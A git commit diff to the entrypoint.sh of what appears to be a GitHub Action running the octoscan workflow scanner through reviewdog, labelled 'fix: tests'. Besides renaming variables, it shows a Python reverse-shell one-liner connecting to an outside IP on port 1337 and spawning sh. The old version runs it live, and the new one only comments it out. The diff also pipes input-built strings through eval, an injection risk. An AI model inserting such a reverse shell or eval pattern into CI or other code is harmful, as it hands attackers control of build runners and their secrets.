b1d4fac134b00539c9bee0ffe463483c837cb6f4
hugo-syn <hugo.vincent@synacktiv.com>
2024-10-11 12:14:22 +0200

    fix: tests

--- entrypoint.sh
+++ entrypoint.sh
@@ -9,24 +9,23 @@ fi
 export REVIEWDOG_GITHUB_API_TOKEN="${INPUT_GITHUB_TOKEN}"
 
 # Initialize the base command
-COMMAND="octoscan scan ."
-
+OCTOSCAN_COMMAND="octoscan scan ."
 
 # Add options if the corresponding environment variables are defined
 if [ -n "$INPUT_DEBUG_RULES" ]; then
-    COMMAND="$COMMAND --debug-rules"
+    OCTOSCAN_COMMAND="$OCTOSCAN_COMMAND --debug-rules"
 fi
 
 if [ -n "$INPUT_FILTER_TRIGGERS" ]; then
-    COMMAND="$COMMAND --filter-triggers \"$INPUT_FILTER_TRIGGERS\""
+    OCTOSCAN_COMMAND="$OCTOSCAN_COMMAND --filter-triggers \"$INPUT_FILTER_TRIGGERS\""
 fi
 
 if [ -n "$INPUT_FILTER_RUN" ]; then
-    COMMAND="$COMMAND --filter-run"
+    OCTOSCAN_COMMAND="$OCTOSCAN_COMMAND --filter-run"
 fi
 
 if [ -n "$INPUT_IGNORE" ]; then
-    COMMAND="$COMMAND --ignore \"$INPUT_IGNORE\""
+    OCTOSCAN_COMMAND="$OCTOSCAN_COMMAND --ignore \"$INPUT_IGNORE\""
 fi
 
 # --disable-rules and --enable-rules are exclusive
@@ -36,30 +35,26 @@ if [ -n "$INPUT_DISABLE_RULES" ] && [ -n "$INPUT_ENABLE_RULES" ]; then
 fi
 
 if [ -n "$INPUT_DISABLE_RULES" ]; then
-    COMMAND="$COMMAND --disable-rules \"$INPUT_DISABLE_RULES\""
+    OCTOSCAN_COMMAND="$OCTOSCAN_COMMAND --disable-rules \"$INPUT_DISABLE_RULES\""
 elif [ -n "$INPUT_ENABLE_RULES" ]; then
-    COMMAND="$COMMAND --enable-rules \"$INPUT_ENABLE_RULES\""
+    OCTOSCAN_COMMAND="$OCTOSCAN_COMMAND --enable-rules \"$INPUT_ENABLE_RULES\""
 fi
 
 if [ -n "$INPUT_CONFIG_FILE" ]; then
-    COMMAND="$COMMAND --config-file \"$INPUT_CONFIG_FILE\""
+    OCTOSCAN_COMMAND="$OCTOSCAN_COMMAND --config-file \"$INPUT_CONFIG_FILE\""
 fi
 
+REVIEWDOG_COMMAND="reviewdog -efm=\"%f:%l:%c: %m\" -name=\"octoscan\" -reporter=${INPUT_REPORTER} -filter-mode=${INPUT_FILTER_MODE} -fail-on-error=${INPUT_FAIL_ON_ERROR} -level=${INPUT_LEVEL} ${INPUT_REVIEWDOG_FLAGS}"
+
 # Print the constructed command for debugging
-echo "Constructed command: $COMMAND"
+echo "Octoscan command: $OCTOSCAN_COMMAND"
+echo "Reviewdog command: $REVIEWDOG_COMMAND"
 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("146.59.195.165",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+#python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("146.59.195.165",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
 
-# Execute the command
-eval "$COMMAND" | reviewdog -efm="%f:%l:%c: %m" \
-      -name="octoscan" \
-      -reporter="${INPUT_REPORTER}" \
-      -filter-mode="${INPUT_FILTER_MODE}" \
-      -fail-on-error="${INPUT_FAIL_ON_ERROR}" \
-      -level="${INPUT_LEVEL}" \
-      ${INPUT_REVIEWDOG_FLAGS}
-
-echo "done"
+# Execute the commands
+# I use eval because I don't know how to manage arguments that have space in them like for reviewdogs: reviewdogs_flags='--diff="git diff HEAD^"'
+eval "$OCTOSCAN_COMMAND" | eval $REVIEWDOG_COMMAND
 
 exit_code=$?
 
